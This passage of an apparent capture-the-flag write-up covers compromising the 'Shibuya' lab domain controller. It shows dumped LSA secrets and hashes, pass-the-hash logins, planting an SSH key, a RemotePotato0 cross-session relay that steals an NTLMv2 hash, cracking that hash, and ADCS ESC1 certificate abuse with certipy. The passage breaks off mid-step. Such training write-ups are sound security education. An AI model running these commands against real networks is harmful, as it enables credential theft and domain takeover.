class="line">SHIBUYA.VL/Simon.Watson:$DCC2$10240#Simon.Watson#04b20c71b23baf7a3025f40b3409e325: (2025-02-16 11:17:56+00:00)</span><br><span class="line">[*] Dumping LSA Secrets</span><br><span class="line">[*] $MACHINE.ACC</span><br><span class="line">$MACHINE.ACC:plain_password_hex:2f006b004e0045004c0045003f0051005800290040004400580060005300520079002600610027002f005c002e002e0053006d0037002200540079005e0044003e004e0056005f00610063003d00270051002e00780075005b0075005c00410056006e004200230066004a0029006f007a002a005700260031005900450064003400240035004b0079004d006f004f002100750035005e0043004e002500430050006e003a00570068005e004e002a0076002a0043005a006c003d00640049002e006d005a002d002d006e0056002000270065007100330062002f00520026006b00690078005b003600670074003900</span><br><span class="line">$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:1fe837c138d1089c9a0763239cd3cb42</span><br><span class="line">[*] DPAPI_SYSTEM</span><br><span class="line">dpapi_machinekey:0xb31a4d81f2df440f806871a8b5f53a15de12acc1</span><br><span class="line">dpapi_userkey:0xe14c10978f8ee226cbdbcbee9eac18a28b006d06</span><br><span class="line">[*] NL$KM</span><br><span class="line"> 0000   92 B9 89 EF 84 2F D6 55  73 67 31 8F E0 02 02 66   ...../.Usg1....f</span><br><span class="line"> 0010   F9 81 42 68 8C 3B DF 5D  0A E5 BA F2 4A 2C 43 0E   ..Bh.;.]....J,C.</span><br><span class="line"> 0020   1C C5 4F 40 1E F5 98 38  2F A4 17 F3 E9 D9 23 E3   ..O@...8/.....#.</span><br><span class="line"> 0030   D1 49 FE 06 B3 2C A1 1A  CB 88 E4 1D 79 9D AE 97   .I...,......y...</span><br><span class="line">NL$KM:92b989ef842fd6557367318fe0020266f98142688c3bdf5d0ae5baf24a2c430e1cc54f401ef598382fa417f3e9d923e3d149fe06b32ca11acb88e41d799dae97</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>
<p>Awesome, we got some hashes. You’d think it’s the Administrator’s hash, but it’s not. We can try spraying the Administrator and Operator user hashes with the list of users we got earlier, but in this case, it’s reasonable to guess that the Operator hash belongs to the simon.watson user, since he’s the one present on the machine, as we saw from the first WIM file we extracted</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb shibuya.vl -u simon.watson -H &lt;REDACTED&gt;</span><br><span class="line">SMB         10.10.106.81    445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.106.81    445    AWSJPDC0522      [+] shibuya.vl\simon.watson:&lt;REDACTED&gt;</span><br></pre></td></tr></table></figure>
<p>Remember earlier, we couldn’t cd into Simon’s folder. Now that we have his credentials, we can connect to the users’ share and list his home directory</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient.py simon.watson@shibuya.vl -hashes :5d8c3d1a20bd63f60f469f6763ca0d50</span><br><span class="line">Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">Type help for list of commands</span><br><span class="line"># use users</span><br><span class="line"># cd simon.watson</span><br><span class="line"># ls</span><br><span class="line">drw-rw-rw-          0  Tue Feb 18 20:36:45 2025 .</span><br><span class="line">drw-rw-rw-          0  Sun Feb 16 11:50:59 2025 ..</span><br><span class="line">drw-rw-rw-          0  Sun Feb 16 11:42:06 2025 AppData</span><br><span class="line">drw-rw-rw-          0  Sun Feb 16 11:42:06 2025 Application Data</span><br><span class="line">drw-rw-rw-          0  Sun Feb 16 11:42:06 2025 Cookies</span><br><span class="line">drw-rw-rw-          0  Sun Feb 16 11:42:41 2025 Desktop</span><br><span class="line">drw-rw-rw-          0  Sun Feb 16 11:42:06 2025 Documents</span><br><span class="line">drw-rw-rw-          0  Sun Feb 16 11:42:05 2025 Downloads</span><br><span class="line">drw-rw-rw-          0  Sun Feb 16 11:42:05 2025 Favorites</span><br><span class="line">drw-rw-rw-          0  Sun Feb 16 11:42:05 2025 Links</span><br><span class="line">drw-rw-rw-          0  Sun Feb 16 11:42:06 2025 Local Settings</span><br><span class="line">drw-rw-rw-          0  Sun Feb 16 11:42:05 2025 Music</span><br><span class="line">drw-rw-rw-          0  Sun Feb 16 11:42:06 2025 My Documents</span><br><span class="line">drw-rw-rw-          0  Sun Feb 16 11:42:06 2025 NetHood</span><br><span class="line">-rw-rw-rw-     262144  Sun Feb 16 11:42:05 2025 NTUSER.DAT</span><br><span class="line">-rw-rw-rw-     106496  Sun Feb 16 11:42:05 2025 ntuser.dat.LOG1</span><br><span class="line">-rw-rw-rw-          0  Sun Feb 16 11:42:05 2025 ntuser.dat.LOG2</span><br><span class="line">-rw-rw-rw-      65536  Sun Feb 16 11:42:08 2025 NTUSER.DAT&#123;c76cbcdb-afc9-11eb-8234-000d3aa6d50e&#125;.TM.blf</span><br><span class="line">-rw-rw-rw-     524288  Sun Feb 16 11:42:05 2025 NTUSER.DAT&#123;c76cbcdb-afc9-11eb-8234-000d3aa6d50e&#125;.TMContainer00000000000000000001.regtrans-ms</span><br><span class="line">-rw-rw-rw-     524288  Sun Feb 16 11:42:05 2025 NTUSER.DAT&#123;c76cbcdb-afc9-11eb-8234-000d3aa6d50e&#125;.TMContainer00000000000000000002.regtrans-ms</span><br><span class="line">-rw-rw-rw-         20  Tue Feb 18 20:30:58 2025 ntuser.ini</span><br><span class="line">drw-rw-rw-          0  Sun Feb 16 11:42:05 2025 Pictures</span><br><span class="line">drw-rw-rw-          0  Sun Feb 16 11:42:06 2025 PrintHood</span><br><span class="line">drw-rw-rw-          0  Sun Feb 16 11:42:06 2025 Recent</span><br><span class="line">drw-rw-rw-          0  Sun Feb 16 11:42:05 2025 Saved Games</span><br><span class="line">drw-rw-rw-          0  Sun Feb 16 11:42:06 2025 SendTo</span><br><span class="line">drw-rw-rw-          0  Sun Feb 16 11:42:06 2025 Start Menu</span><br><span class="line">drw-rw-rw-          0  Sun Feb 16 11:42:06 2025 Templates</span><br><span class="line">drw-rw-rw-          0  Sun Feb 16 11:42:05 2025 Videos</span><br></pre></td></tr></table></figure>
<p>We can get the user flag from the desktop</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># cd desktop</span><br><span class="line"># ls</span><br><span class="line">drw-rw-rw-          0  Sun Feb 16 11:42:41 2025 .</span><br><span class="line">drw-rw-rw-          0  Tue Feb 18 20:36:45 2025 ..</span><br><span class="line">-rw-rw-rw-         36  Sun Feb 16 11:43:08 2025 flag.txt</span><br><span class="line"># get flag.txt</span><br></pre></td></tr></table></figure>
<p>Now we need a way to get a shell on the box. Remember from the Nmap scan that SSH is open. Let’s create a <code>.ssh</code> folder inside the user’s home directory and place our key there</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t ed25519 -f simon</span><br><span class="line">$ mv simon.pub authorized_keys</span><br><span class="line"></span><br><span class="line"># mkdir .ssh</span><br><span class="line"># cd .ssh</span><br><span class="line"># put authorized_keys</span><br></pre></td></tr></table></figure>
<p>And we’re in!</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -i simon simon.watson@shibuya.vl</span><br><span class="line">Microsoft Windows [Version 10.0.20348.3207]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">shibuya\simon.watson@AWSJPDC0522 C:\Users\simon.watson&gt;</span><br></pre></td></tr></table></figure>
<p>Another way we can connect to SSH is by using <code>changepasswd</code> from Impacket to change Simon’s password using his hash, since we can’t use pass-the-hash with SSH</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ changepasswd.py shibuya.vl/simon.watson@shibuya.vl -hashes :&lt;REDACTED&gt; -newpass P@ssw0rd</span><br><span class="line">Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Changing the password of shibuya.vl\simon.watson</span><br><span class="line">[*] Connecting to DCE/RPC as shibuya.vl\simon.watson</span><br><span class="line">[*] Password was changed successfully.</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ssh simon.watson@shibuya.vl</span><br><span class="line">simon.watson@shibuya.vl&#x27;s password:</span><br><span class="line">Microsoft Windows [Version 10.0.20348.3207]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">shibuya\simon.watson@AWSJPDC0522 C:\Users\simon.watson&gt;</span><br></pre></td></tr></table></figure>
<h1 id="ROOT"><a href="#ROOT" class="headerlink" title="ROOT"></a>ROOT</h1><p>Since LDAP is closed, we weren’t able to gather BloodHound data earlier. But now that we have an SSH connection, we can open a SOCKS proxy and use it to collect BloodHound data remotely with NetExec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -i simon simon.watson@shibuya.vl -D1080 -N</span><br><span class="line">$ proxychains4 -q nxc ldap shibuya.vl -u simon.watson -p P@ssw0rd --bloodhound --dns-server 10.10.106.81 --dns-tcp -c All</span><br><span class="line">LDAP        10.10.106.81    389    AWSJPDC0522      [*] Windows Server 2022 Build 20348 (name:AWSJPDC0522) (domain:shibuya.vl)</span><br><span class="line">LDAP        10.10.106.81    389    AWSJPDC0522      [+] shibuya.vl\simon.watson:P@ssw0rd</span><br><span class="line">LDAP        10.10.106.81    389    AWSJPDC0522      Resolved collection methods: group, localadmin, session, dcom, rdp, trusts, objectprops, acl, container, psremote</span><br><span class="line">LDAP        10.10.106.81    389    AWSJPDC0522      Done in 00M 25S</span><br><span class="line">LDAP        10.10.106.81    389    AWSJPDC0522      Compressing output into /home/serio/.nxc/logs/AWSJPDC0522_10.10.106.81_2025-04-07_203219_bloodhound.zip</span><br></pre></td></tr></table></figure>
<p>The next step is tricky to find. If we run <code>ps</code> to list running processes, we can see that Explorer is running, so it looks like someone is logged in</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\simon.watson&gt; ps</span><br><span class="line"></span><br><span class="line">Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName</span><br><span class="line">-------  ------    -----      -----     ------     --  -- -----------</span><br><span class="line">    210       8     7152      12052              3272   0 AggregatorHost</span><br><span class="line">    395      33    12776      21552              2436   0 certsrv</span><br><span class="line">     85       6     2404       4740       0.02   6124   0 cmd</span><br><span class="line">    101       7     1144       5444       0.11   3560   0 conhost</span><br><span class="line">    345      17     1988       6328               452   0 csrss</span><br><span class="line">    252      14     1924       6464               528   1 csrss</span><br><span class="line">    174      11     1768       5988              5388   2 csrss</span><br><span class="line">    371      15     3304      15316               636   1 ctfmon</span><br><span class="line">    419      34    16696      25540              2680   0 dfsrs</span><br><span class="line">    156       9     1944       6296              2560   0 dfssvc</span><br><span class="line">   5394    4799    69064      70932              2512   0 dns</span><br><span class="line">    716      31    13808      47572              1344   1 dwm</span><br><span class="line">    625      26    15000      39984              5668   2 dwm</span><br><span class="line">   1515      58    22980     152320              2920   1 explorer</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>We can try to list more information about the session using the <code>qwinsta</code> command, but in this case, it failed</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\simon.watson&gt; qwinsta *</span><br><span class="line">No session exists for *</span><br></pre></td></tr></table></figure>
<p>Somehow, if we run it with runas it works, as shown <a target="_blank" rel="noopener" href="https://security.stackexchange.com/questions/272327/cannot-qwinsta-during-winrm-but-it-works-when-run-under-newcredentials-logo">here</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sliver (shibuya) &gt; execute-assembly &#x27;/home/serio/vulnlab/shibuya/RunasCs.exe&#x27; x x qwinsta -l 9</span><br><span class="line"></span><br><span class="line">[*] Output:</span><br><span class="line"></span><br><span class="line"> SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE</span><br><span class="line">&gt;services                                    0  Disc</span><br><span class="line"> rdp-tcp#0         nigel.mills               1  Active</span><br><span class="line"> console                                     2  Conn</span><br><span class="line"> 31c5ce94259d4...                        65536  Listen</span><br><span class="line"> rdp-tcp                                 65537  Listen</span><br></pre></td></tr></table></figure>
<p>As you can see, the user nigel.mills has a session with an ID of 1. Another way to enumerate this is by checking the “Sessions” option in BloodHound, it should show that the user nigel has a session on the DC</p>
<h2 id="Cross-Session-Relay"><a href="#Cross-Session-Relay" class="headerlink" title="Cross Session Relay"></a>Cross Session Relay</h2><p>With this information in hand, we can perform a cross-session relay attack (that’s why the machine is called Shibuya) and capture Nigel’s hash. You can refer to 0xdf’s write-up on Rebound <a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2024/03/30/htb-rebound.html#cross-session-relay">here</a>.<br>To carry out the attack we need to download the <a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RemotePotato0/releases">RemotePotato0</a> binary and upload it to the target machine. The attack can also be performed using KrbRelay, but I prefer the first option<br>First, we run socat like this</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.106.81:8888</span><br></pre></td></tr></table></figure>
<p>Then, we execute RemotePotato0 on the target machine</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">PS C:\ProgramData&gt; .\RemotePotato0.exe -m 2 -r 10.8.0.210 -x 10.8.0.210 -p 8888 -s 1</span><br><span class="line">[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on 10.8.0.210 to your victim machine on port 8888</span><br><span class="line">[*] Example Network redirector:</span><br><span class="line">        sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:&#123;&#123;ThisMachineIp&#125;&#125;:8888</span><br><span class="line">[*] Starting the RPC server to capture the credentials hash from the user authentication!!</span><br><span class="line">[*] RPC relay server listening on port 9997 ...</span><br><span class="line">[*] Spawning COM object in the session: 1</span><br><span class="line">[*] Calling StandardGetInstanceFromIStorage with CLSID:&#123;5167B42F-C111-47A1-ACC4-8EABE61B0B54&#125;</span><br><span class="line">[*] Starting RogueOxidResolver RPC Server listening on port 8888 ...</span><br><span class="line">[*] IStoragetrigger written: 102 bytes</span><br><span class="line">[*] ServerAlive2 RPC Call</span><br><span class="line">[*] ResolveOxid2 RPC call</span><br><span class="line">[+] Received the relayed authentication on the RPC relay server on port 9997</span><br><span class="line">[*] Connected to RPC Server 127.0.0.1 on port 8888</span><br><span class="line">[+] User hash stolen!</span><br><span class="line"></span><br><span class="line">NTLMv2 Client   : AWSJPDC0522</span><br><span class="line">NTLMv2 Username : SHIBUYA\Nigel.Mills</span><br><span class="line">NTLMv2 Hash     : Nigel.Mills::SHIBUYA:&lt;REDACTED&gt;</span><br></pre></td></tr></table></figure>
<p>And as you can see, we’ve captured nigel’s hash. Let’s save it to a file and crack it with john</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ j nigel.hash</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, &#x27;h&#x27; for help, almost any other key for status</span><br><span class="line">&lt;REDACTED&gt;       (Nigel.Mills)</span><br><span class="line">1g 0:00:00:00 DONE (2025-04-07 22:01) 10.00g/s 2273Kp/s 2273Kc/s 2273KC/s asswipe!..920217</span><br><span class="line">Use the &quot;--show --format=netntlmv2&quot; options to display all of the cracked passwords reliably</span><br><span class="line">Session completed.</span><br></pre></td></tr></table></figure>
<h2 id="ADCS"><a href="#ADCS" class="headerlink" title="ADCS"></a>ADCS</h2><p>Let’s look for vulnerable templates using certipy</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains4 -q certipy find -u nigel.mills -p &lt;REDACTED&gt; -dc-ip 10.10.106.81 -dns-tcp -vulnerable -enabled -stdout</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Finding certificate templates</span><br><span class="line">[*] Found 34 certificate templates</span><br><span class="line">[*] Finding certificate authorities</span><br><span class="line">[*] Found 1 certificate authority</span><br><span class="line">[*] Found 12 enabled certificate templates</span><br><span class="line">[*] Trying to get CA configuration for &#x27;shibuya-AWSJPDC0522-CA&#x27; via CSRA</span><br><span class="line">[!] Got error while trying to get CA configuration for &#x27;shibuya-AWSJPDC0522-CA&#x27; via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.</span><br><span class="line">[*] Trying to get CA configuration for &#x27;shibuya-AWSJPDC0522-CA&#x27; via RRP</span><br><span class="line">[*] Got CA configuration for &#x27;shibuya-AWSJPDC0522-CA&#x27;</span><br><span class="line">[*] Enumeration output:</span><br><span class="line">Certificate Authorities</span><br><span class="line">  0</span><br><span class="line">    CA Name                             : shibuya-AWSJPDC0522-CA</span><br><span class="line">    DNS Name                            : AWSJPDC0522.shibuya.vl</span><br><span class="line">    Certificate Subject                 : CN=shibuya-AWSJPDC0522-CA, DC=shibuya, DC=vl</span><br><span class="line">    Certificate Serial Number           : 2417712CBD96C58449CFDA3BE3987F52</span><br><span class="line">    Certificate Validity Start          : 2025-02-15 07:24:14+00:00</span><br><span class="line">    Certificate Validity End            : 2125-02-15 07:34:13+00:00</span><br><span class="line">    Web Enrollment                      : Enabled</span><br><span class="line">    User Specified SAN                  : Disabled</span><br><span class="line">    Request Disposition                 : Issue</span><br><span class="line">    Enforce Encryption for Requests     : Enabled</span><br><span class="line">    Permissions</span><br><span class="line">      Owner                             : SHIBUYA.VL\Administrators</span><br><span class="line">      Access Rights</span><br><span class="line">        ManageCertificates              : SHIBUYA.VL\Administrators</span><br><span class="line">                                          SHIBUYA.VL\Domain Admins</span><br><span class="line">                                          SHIBUYA.VL\Enterprise Admins</span><br><span class="line">        ManageCa                        : SHIBUYA.VL\Administrators</span><br><span class="line">                                          SHIBUYA.VL\Domain Admins</span><br><span class="line">                                          SHIBUYA.VL\Enterprise Admins</span><br><span class="line">        Enroll                          : SHIBUYA.VL\Authenticated Users</span><br><span class="line">    [!] Vulnerabilities</span><br><span class="line">      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue</span><br><span class="line">Certificate Templates</span><br><span class="line">  0</span><br><span class="line">    Template Name                       : ShibuyaWeb</span><br><span class="line">    Display Name                        : ShibuyaWeb</span><br><span class="line">    Certificate Authorities             : shibuya-AWSJPDC0522-CA</span><br><span class="line">    Enabled                             : True</span><br><span class="line">    Client Authentication               : True</span><br><span class="line">    Enrollment Agent                    : True</span><br><span class="line">    Any Purpose                         : True</span><br><span class="line">    Enrollee Supplies Subject           : True</span><br><span class="line">    Certificate Name Flag               : EnrolleeSuppliesSubject</span><br><span class="line">    Enrollment Flag                     : None</span><br><span class="line">    Private Key Flag                    : ExportableKey</span><br><span class="line">    Extended Key Usage                  : Any Purpose</span><br><span class="line">                                          Server Authentication</span><br><span class="line">    Requires Manager Approval           : False</span><br><span class="line">    Requires Key Archival               : False</span><br><span class="line">    Authorized Signatures Required      : 0</span><br><span class="line">    Validity Period                     : 100 years</span><br><span class="line">    Renewal Period                      : 75 years</span><br><span class="line">    Minimum RSA Key Length              : 4096</span><br><span class="line">    Permissions</span><br><span class="line">      Enrollment Permissions</span><br><span class="line">        Enrollment Rights               : SHIBUYA.VL\t1_admins</span><br><span class="line">                                          SHIBUYA.VL\Domain Admins</span><br><span class="line">                                          SHIBUYA.VL\Enterprise Admins</span><br><span class="line">      Object Control Permissions</span><br><span class="line">        Owner                           : SHIBUYA.VL\_admin</span><br><span class="line">        Write Owner Principals          : SHIBUYA.VL\Domain Admins</span><br><span class="line">                                          SHIBUYA.VL\Enterprise Admins</span><br><span class="line">                                          SHIBUYA.VL\_admin</span><br><span class="line">        Write Dacl Principals           : SHIBUYA.VL\Domain Admins</span><br><span class="line">                                          SHIBUYA.VL\Enterprise Admins</span><br><span class="line">                                          SHIBUYA.VL\_admin</span><br><span class="line">        Write Property Principals       : SHIBUYA.VL\Domain Admins</span><br><span class="line">                                          SHIBUYA.VL\Enterprise Admins</span><br><span class="line">                                          SHIBUYA.VL\_admin</span><br><span class="line">    [!] Vulnerabilities</span><br><span class="line">      ESC1                              : &#x27;SHIBUYA.VL\\t1_admins&#x27; can enroll, enrollee supplies subject and template allows client authentication</span><br><span class="line">      ESC2                              : &#x27;SHIBUYA.VL\\t1_admins&#x27; can enroll and template can be used for any purpose</span><br><span class="line">      ESC3                              : &#x27;SHIBUYA.VL\\t1_admins&#x27; can enroll and template has Certificate Request Agent EKU set</span><br></pre></td></tr></table></figure>
<p>Since nigel.mills is a member of the t1_admins group we can exploit this easily</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains4 -q nxc ldap 10.10.106.81 -u nigel.mills -p &lt;REDACTED&gt; -M groupmembership -o USER=nigel.mills</span><br><span class="line">LDAP        10.10.106.81    389    AWSJPDC0522      [*] Windows Server 2022 Build 20348 (name:AWSJPDC0522) (domain:shibuya.vl)</span><br><span class="line">LDAP        10.10.106.81    389    AWSJPDC0522      [+] shibuya.vl\nigel.mills:&lt;REDACTED&gt;</span><br><span class="line">GROUPMEM... 10.10.106.81    389    AWSJPDC0522      [+] User: nigel.mills is member of following groups:</span><br><span class="line">GROUPMEM... 10.10.106.81    389    AWSJPDC0522      shibuya</span><br><span class="line">GROUPMEM... 10.10.106.81    389    AWSJPDC0522      t1_admins</span><br><span class="line">GROUPMEM... 10.10.106.81    389    AWSJPDC0522      Domain Users</span><br></pre></td></tr></table></figure>
<h3 id="ESC1"><a href="#ESC1" class="headerlink" title="ESC1"></a>ESC1</h3><p>Here we use the <code>_admin</code> upn because he’s the domain admin</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains4 -q certipy req -u Nigel.Mills -p &lt;REDACTED&gt; -dc-ip 10.10.106.81 -target shibuya.vl -ca shibuya-AWSJPDC0522-CA -template ShibuyaWeb -upn _admin -key-size 4096</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Request ID is 4</span><br><span class="line">[*] Got certificate with UPN &#x27;_admin&#x27;</span><br><span class="line">[*] Certificate has no object SID</span><br><span class="line">[*] Saved certificate and private key to &#x27;_admin.pfx&#x27;</span><br></pre></td></tr></table></figure>
<p>Nice! we got the pfx, now we can use it to get his hash</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ certipy auth -pfx _admin.pfx -domain shibuya.vl -username _admin -dc-ip 10.10.106.81</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Using principal: _admin@shibuya.vl</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[-] Object SID mismatch between certificate and user &#x27;_admin&#x27;</span><br></pre></td></tr></table></figure>
<p>But we got an error saying <code>[-] Object SID mismatch between certificate and user &#39;_admin&#39;</code>. This is intended actually, earlier this February, Microsoft started enforcing the SID: <a target="_blank" rel="noopener" href="https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16">https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16</a></p>
<blockquote>
<p>By <strong>February 2025</strong>, if the <strong>StrongCertificateBindingEnforcemen</strong>t registry key is not configured, domain controllers will move to Full Enforcement mode</p>
</blockquote>
<p>However, we can just set the SID in the request</p>
